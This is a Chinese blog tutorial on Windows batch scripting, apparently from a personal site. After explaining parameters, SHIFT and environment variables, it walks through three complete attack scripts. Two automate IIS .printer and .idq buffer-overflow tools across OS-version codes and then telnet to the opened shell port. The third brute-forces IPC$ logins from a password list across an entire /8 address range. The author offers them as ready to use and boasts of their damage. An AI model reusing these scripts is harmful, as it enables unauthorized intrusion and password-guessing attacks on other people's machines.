<h2 id="第三部分：批处理与变量"><a href="#第三部分：批处理与变量" class="headerlink" title="第三部分：批处理与变量"></a><strong>第三部分：批处理与变量</strong></h2><p>　　在批处理中适当的引用变量将会使你所编制的程序应用面更广。批处理每次能处理的变量从%0~%9共10个。其中%0默认给批处理的文件名使用。除非在使用SHIFT命令后%0才能被%1所替代。引用shift命令的例子如果把%1前面多加上一个%0那么结果如下：<br>C::>SHIFT.BAT 1 2 3 4 5 6 7 8 9 10 11<br>SHIFT.BAT 1 2 3 4 5 6 7 8 9<br>1 2 3 4 5 6 7 8 9 10<br>2 3 4 5 6 7 8 9 10 11</p>
<p>　　系统是如何区分每个变量的呢，系统区分变量的规则为字符串中间的空格，即只要发现空格就把空格前面的字符当作一个变量而空格后面的字符则作为另一个变量。如果你的变量是一个当中包含空格的长目录名这时候你需要用上一节特殊符号8中所用的引号将他圈起来。<br>　　<br>例：<br>批处理内容为：<br>ECHO %1<br>ECHO %2<br>ECHO %3<br>输入命令：<br>C:>TEST “Program Files” Program Files<br>Program Files<br>Program<br>Files</p>
<p>　　在一个复杂的批处理中又可能同时使用的变量会超过10个这时候会和系统的规则想冲突那么这个问题怎么解决呢？在系统中还有一种变量称之为环境变量（使用SET命令可以查看当前系统的环境变量）如当前系统目录是%windir%或%SystemRoot%等。当同时使用的参数超过10个的时候，我们可以把某些在后面的程序中还要调用的变量保存为环境变量。具体用法如 SET A=%1 这样我们就命名了一个新的环境变量A在调用变量A的时候要%A%这样调用，环境变量不受SHIFT命令影响。如果要改变一个环境变量需要重新对其设置才能改变。当然也可以进行变量与变量之间的传递来达到目的。<br>　　<br>下面我们来看一个例子，批处理如下：<br>ECHO OFF<br>SET PASS=%1<br>SHIFT<br>SET PASS1=%1<br>SHIFT<br>ECHO %PASS% %PASS1% %1 %2 %3 %4 %5 %6 %7 %8 %9<br>SHIFT<br>ECHO %PASS% %PASS1% %9<br>SET PASS=%PASS1% 变量的传递<br>SET PASS1=%9<br>SHIFT<br>ECHO %PASS% %PASS1% %9<br>使用命令：C:>TEST A B 3 4 5 6 7 8 9 10 K L<br>A B 3 4 5 6 7 8 9 10 K 注意：这一行显示了11个变量<br>A B L 在使用了3次SHIFT之后%9变成了L<br>B L 变量的传递后的结果</p>
<h2 id="第四部分：完整案例"><a href="#第四部分：完整案例" class="headerlink" title="第四部分：完整案例"></a><strong>第四部分：完整案例</strong></h2><p>　　以上就是批处理的一些用法。现在我们把这些用法结合起来详细的分析一下目前网上发布的一些批处理，看看他们是怎么运作的。这里我将列举三个例子来详细分析，为了保持程序的完整我的注释会加在//后面。</p>
<h3 id="例一"><a href="#例一" class="headerlink" title="例一"></a><strong>例一</strong></h3><p>这个例子是利用iis5hack.exe对有.printer漏洞的主机进行溢出的批处理。用到的程序有iis5hack.exe和系统自带的telnet.exe。iis5hack的命令格式为：<br>iis5hack &lt;目标ip&gt; &lt;目标端口&gt; &lt;目标版本&gt; &lt;溢出连接端口&gt;目标版本为0-9这10个数字分别对应不同语言版本和sp的系统版本，我们编制的批处理使用的命令格式为 <iis.bat 目标ip="" （开始版本号）="">开始版本号可有可无。程序如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">@echo off /\*关闭命令回显</div><div class="line">if &quot;%1%&quot;==&quot;&quot; goto help //判断%1是否为空，%1为目标ip</div><div class="line">if &quot;%2%&quot;==&quot;1&quot; goto 1 //判断%2是否为1，为1则跳转标志1</div><div class="line">if &quot;%2%&quot;==&quot;2&quot; goto 2 //%2为开始版本号，如果没有设置则</div><div class="line">if &quot;%2%&quot;==&quot;3&quot; goto 3 //如果存在则从匹配的地方开始执行</div><div class="line">if &quot;%2%&quot;==&quot;4&quot; goto 4</div><div class="line">if &quot;%2%&quot;==&quot;5&quot; goto 5</div><div class="line">if &quot;%2%&quot;==&quot;6&quot; goto 6</div><div class="line">if &quot;%2%&quot;==&quot;7&quot; goto 7</div><div class="line">if &quot;%2%&quot;==&quot;8&quot; goto 8</div><div class="line">if not EXIST iis5hack.exe goto file //没有发现iis5hack.exe就执行标志file段内容</div><div class="line">ping %1 -n 1 | find &quot;Received = 1&quot; //ping目标1次，从结果中发现Received = 1</div><div class="line">if errorlevel 1 goto error //如果返回代码为1则执行error段(代码1为没有发现 0为发现并成功执行)</div><div class="line">iis5hack %1 80 9 88 | find &quot;good&quot; //开始溢出目标端口80 系统代码9 溢出后连接端口88 在执行结果中发现字符串”good”(溢出成功后才会有字符串good)</div><div class="line">if not errorlevel 1 goto telnet //如果没有错误代码1（溢出成功）就执行telnet段的内容。</div><div class="line">echo 操作系统类型 9 失败! /否则显示这一句</div><div class="line">:8 //以下代码内容参照上面</div><div class="line">iis5hack %1 80 8 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 8 失败!</div><div class="line">:7</div><div class="line">iis5hack %1 80 7 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 7 失败!</div><div class="line">:6</div><div class="line">iis5hack %1 80 6 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 6 失败!</div><div class="line">:5</div><div class="line">iis5hack %1 80 5 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 5 失败!</div><div class="line">:4</div><div class="line">iis5hack %1 80 4 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 4 失败!</div><div class="line">:3</div><div class="line">iis5hack %1 80 3 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 3 失败!</div><div class="line">:2</div><div class="line">iis5hack %1 80 2 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 2 失败!</div><div class="line">:1</div><div class="line">iis5hack %1 80 1 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 1 失败!</div><div class="line">:0</div><div class="line">iis5hack %1 80 0 88 | find &quot;good&quot;</div><div class="line">if not errorlevel 1 goto telnet</div><div class="line">echo 操作系统类型 0 失败!</div><div class="line">goto error</div><div class="line">:telnet</div><div class="line">telnet %1 88 //开始连接目标ip的88端口</div><div class="line">goto exit //连接中断后跳转exit段</div><div class="line">:error //error段显示错误后的帮助信息</div><div class="line">echo 可能网络不能连接或者对方以修补该漏洞!请按照下面的格式手工尝试一次!</div><div class="line">echo iis5hack [目标IP] [WEB端口] [系统类型] [开放端口]</div><div class="line">ECHO 中文: 0</div><div class="line">ECHO 中文+sp1: 1</div><div class="line">ECHO 英文: 2</div><div class="line">ECHO 英文+sp1: 3</div><div class="line">ECHO 日语: 4</div><div class="line">ECHO 日语+sp1: 5</div><div class="line">ECHO 韩文: 6</div><div class="line">ECHO 韩文+sp1: 7</div><div class="line">ECHO 墨西哥语: 8</div><div class="line">ECHO 墨西哥语+sp1: 9</div><div class="line">goto exit //跳转exit段</div><div class="line">:file //file段显示文件没有发现的信息</div><div class="line">echo 文件iis5hack.exe没有发现!程序终止运行!</div><div class="line">goto exit //跳转exit段</div><div class="line">:help //help段显示本批处理的使用格式帮助</div><div class="line">echo 本程序用法如下:</div><div class="line">echo iis [目标ip]</div><div class="line">echo iis [目标ip] [开始的号码9-0]</div><div class="line">:exit //exit段为程序出口</div></pre></td></tr></table></figure></iis.bat></p>
<p>这个批处理基本没有什么循环只是一路走下来。所以代码比较长难度不大！</p>
<h3 id="例二"><a href="#例二" class="headerlink" title="例二"></a><strong>例二</strong></h3><p>这个例子是用iisidq.exe对有idq漏洞的机器进行溢出的批处理。使用的程序有iisidq.exe和系统自带的程序telnet.exe。iisidq.exe的用法如下：<br>运行参数: 操作系统类型 目的地址 web端口 1 溢出监听端口 &lt;输入命令1&gt;<br>其中,如果输入命令参数没有输入,那么,默认为:”cmd.exe”。<br>其中操作系统类型类型的代码范围是0-14。我们编制的批处理使用的命令格式为 <idq.bat 目标ip="">程序如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">@echo off //同例一</div><div class="line">if not EXIST iisidq.exe goto file //同例一</div><div class="line">if %1 == &quot;&quot; goto error //同例一</div><div class="line">ping %1 -n 1 | find &quot;Received = 1&quot; //同例一</div><div class="line">if errorlevel 1 goto error1 //同例一</div><div class="line">set b=%1 //创建一个环境变量b,将变量%1的内容传递给环境变量b。变量b的内容以后将是目标ip</div><div class="line">set a=0 //创建一个环境变量a并指定环境变量a为0。由于使用整个批处理的循环所以用a来做计数器。</div><div class="line">:no //no段开始</div><div class="line">if %a%==0 set d=0 //如果环境变量a=0则创建环境变量d设定环境变量d=0。</div><div class="line">if %a%==1 set d=1 //环境变量d其实是操作系统类型代码，用计数器来控制其</div><div class="line">if %a%==2 set d=2 //变动。</div><div class="line">if %a%==3 set d=3</div><div class="line">if %a%==4 set d=4</div><div class="line">if %a%==5 set d=5</div><div class="line">if %a%==6 set d=6</div><div class="line">if %a%==7 set d=7</div><div class="line">if %a%==9 set d=9</div><div class="line">if %a%==10 set d=13</div><div class="line">if %a%==11 set d=14</div><div class="line">goto 0 //变量传递完成后转到标志0处运行</div><div class="line">:1</div><div class="line">echo 正在执行第%d%项!与目标%b%不能连接!正在尝试连接请等候......</div><div class="line">:0 //标志0开始</div><div class="line">IISIDQ %d% %b% 80 1 99 |find &quot;good&quot; //按格式发送溢出命令并在结果中发现字符串good（发送代码成功才会有字符串good）</div><div class="line">if errorlevel 1 goto 1 //如果没有good字符串则没有发送成跳</div><div class="line">//转标志1处继续尝试发送</div><div class="line">ping 127.0.0.1 -n 8 &gt;nul //ping自己8次相当于延时8秒不显示执</div><div class="line">//行结果</div><div class="line">echo 正在执行第%d%项! //报告正在溢出的操作系统类型</div><div class="line">telnet %b% 99 //连接溢出端口</div><div class="line">echo. //显示一个空行</div><div class="line">if %d%==14 goto error1 //如果操作系统类型为14则跳转error1处（循环出口）</div><div class="line">if %d%==13 set a=11 //开始用计数器对操作系统代码重新附值</div><div class="line">if %d%==9 set a=10</div><div class="line">if %d%==7 set a=9</div><div class="line">if %d%==6 set a=7</div><div class="line">if %d%==5 set a=6</div><div class="line">if %d%==4 set a=5</div><div class="line">if %d%==3 set a=4</div><div class="line">if %d%==2 set a=3</div><div class="line">if %d%==1 set a=2</div><div class="line">if %d%==0 set a=1</div><div class="line">goto no //附值完成跳转no段执行</div><div class="line">:file //以下都是出错后的帮助提示</div><div class="line">echo IIsidq.exe没有发现!将该文件和本文件放在同一目录!</div><div class="line">goto exit</div><div class="line">:error</div><div class="line">echo 错误!目标ip不可识别!请使用下面的格式连接!</div><div class="line">echo idq [目标IP]</div><div class="line">goto exit</div><div class="line">:error1</div><div class="line">echo 连接没有成功!可能目标机器已经修补了该漏洞或者网络故障所至!</div><div class="line">echo 请按照下面的格式手工尝试!</div><div class="line">echo iisidq [目标类型] [目标IP] [目标端口] [连接方式] [溢出端口]</div><div class="line">echo telnet [目标ip] [溢出端口]</div><div class="line">:exit //整个程序的出口</div></pre></td></tr></table></figure></idq.bat></p>
<p>这个批处理采用的整体循环掌握好计数器部分就掌握了这个批处理。</p>
<h3 id="例三"><a href="#例三" class="headerlink" title="例三"></a><strong>例三</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">for /l %%a in (0,1,255) do for /l %%b in (0,1,255) do for /l %%c in (1,1,254) do for /f &quot;tokens=1,2*&quot; %%e in (userpass.txt) do net use \\%1.%%a.%%b.%%c\\ipc$ %%e /u:%%f</div><div class="line"></div><div class="line">上面的命令为1条命令。大家可以看出该命令使用了4个FOR来套用的。用法为：C:\&gt;TEST.BAT 218 当输入218回车后该命令会由第1个for取初始值0为%%a然后继续取第2个for的初始值0为%%b继续取第3个for的初始值1为%%c最后一个</div><div class="line"></div><div class="line">for是将userpass.txt中的第一段字符作为密码%%e第二段字符作为用户名%%f最后执行命令 (这里我把上面的值都带进去，设密码为123 用户名为 abc)</div><div class="line">net usr \\218.0.0.1\ipc$ 123 /u:abc</div></pre></td></tr></table></figure>
<p>当然上面这个例子可能有些朋友会说太简单并且太死板不灵活。我把这个例子做了些修改（完整文件见光盘ipc.bat）由兴趣的朋友可以自己看看。修改后的程序可以灵活的查找你指定开始到结束或你指定开始到最大ip的范围。当然功能还可以在加强，至于能加强到什么地步能不能成为一个新的工具那就是你的事了。</p>
<p>这个的循环动作大了点主要是ip的数字替换麻烦所以没办法。这个批处理我就不写注释了，大家好好的参考上面的内容你会很快看懂这个批处理的。看懂了得不要说简单哦！最起码这是个没有使用任何第三方工具就能探测并保存弱口令的批处理了！！简单的改一改杀伤力还是很大的。以上这些批处理全部在win2000和 xp下测试通过最大的优点就是只有一个批处理文件并且绝对不会误报。缺点就是太长。</p>
<blockquote>
<p><strong>PS:学编程前最好先不学会这个，虽然他不属于编程，但具有编程的思想。</strong></p>
</blockquote>

      
    </div>
    <div class="article-footer">
      <blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    
    <li class="post-copyright-link hidden-xs">
      <strong>本文链接：</strong>
      <a href="https://mengze.top/[K]批处理知识点/" title="【K】批处理知识点" target="_blank" rel="external">https://mengze.top/[K]批处理知识点/</a>
    </li>
    
    <li class="post-copyright-license">
      <strong>版权声明： </strong> 本站所有文章除特别声明外，均遵循 <u><a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN</a></u> 及 <u><a href="https://mengze.top/MZ-ATY%E6%B3%9B%E5%86%85%E5%AE%B9%E8%81%94%E5%90%88%E5%A3%B0%E6%98%8E/" target="_blank" rel="external">MZ-ATY VCJS 1.0</a></u> 协议。转载请附上原文出处链接和本声明。
    </li>
  </ul>
</blockquote>

    </div>
  </article>
  
    
  <section id="comments">
  	
  </section>


  
</div>

  <nav class="bar bar-footer clearfix" data-stick-bottom>
  <div class="bar-inner">
  
  <ul class="pager pull-left">
    
    <li class="prev">
      <a href="/[C]JAVA基础知识点/" title="【C】JAVA基础知识点"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
    </li>
    
    
    <li class="next">
      <a href="/[K]WindowsCMD命令大全/" title="【K】WindowsCMD命令大全"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
    </li>
    
    
    <li class="toggle-toc">
      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
        <span>[&nbsp;</span><span>文章目录</span>
        <i class="text-collapsed icon icon-anchor"></i>
        <i class="text-in icon icon-close"></i>
        <span>]</span>
      </a>
    </li>
    
  </ul>
  
  
  <!-- Button trigger modal -->
  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
  </div> -->
  
  
  <div class="bar-right">
    
    <div class="share-component" data-sites="weibo,qq,qzone,wechat,douban,linkedin" data-mobile-sites="weibo,qq,qzone,wechat,douban,linkedin"></div>
    
  </div>
  </div>
</nav>
  
<!-- Modal -->
<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
  <div class="modal-dialog" role="document">
    <div class="modal-content donate">
      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
      <div class="modal-body">
        <div class="donate-box">
          <div class="donate-head">
            <p>感谢您的支持，我会继续努力的!</p>
          </div>
          <div class="tab-content">
            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
              <div class="donate-payimg">
                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫" />
              </div>
              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
            </div>
            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
              <div class="donate-payimg">
                <img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫" />
              </div>
              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
            </div>
          </div>
          <div class="donate-footer">
            <ul class="nav nav-tabs nav-justified" role="tablist">
              <li role="presentation" class="active">
                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
              </li>
              <li role="presentation" class="">
                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>



</main>

  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
    
	
    <ul class="social-links">
    	
        <li><a href="https://github.com/AaronTYin" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
        
        <li><a href="https://weibo.com/6148427895" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
        
        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
        
    </ul>

    <div class="copyright">
        
        &copy; 2017-2020 MengZeATY
        
        <div class="publishby">
            <p>Theme <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a> by <a href="https://github.com/cofess" target="_blank"> cofess </a><br>
            Hosted by <a href="https://pages.coding.me" style="font-weight: bold" rel="external nofollow">Coding Pages</a></p>
        </div>
    </div>
</footer>
  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
<script>
window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
</script>
<script src="/js/plugin.min.js"></script>
<script src="/js/application.js"></script>

    <script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
            UNTITLED: '(未命名)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
<script src="/js/insight.js"></script>





   
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





   


  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
  <script>
  //利用 FancyBox 实现点击图片放大
  $(document).ready(function() {
    $('article img').not('[hidden]').not('.panel-body img').each(function() {
      var $image = $(this);
      var imageCaption = $image.attr('alt');
      var $imageWrapLink = $image.parent('a');
      if ($imageWrapLink.length < 1) {
        var src = this.getAttribute('src');
        var idx = src.lastIndexOf('?');
        if (idx != -1) {
          src = src.substring(0, idx);
        }
        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
      }
      $imageWrapLink.attr('data-fancybox', 'images');
      if (imageCaption) {
        $imageWrapLink.attr('data-caption', imageCaption);
      }
    });
    $().fancybox({
      selector: '[data-fancybox="images"]',
      hash: false,
      loop: false,
    });
  });
  </script>





</body>
</html>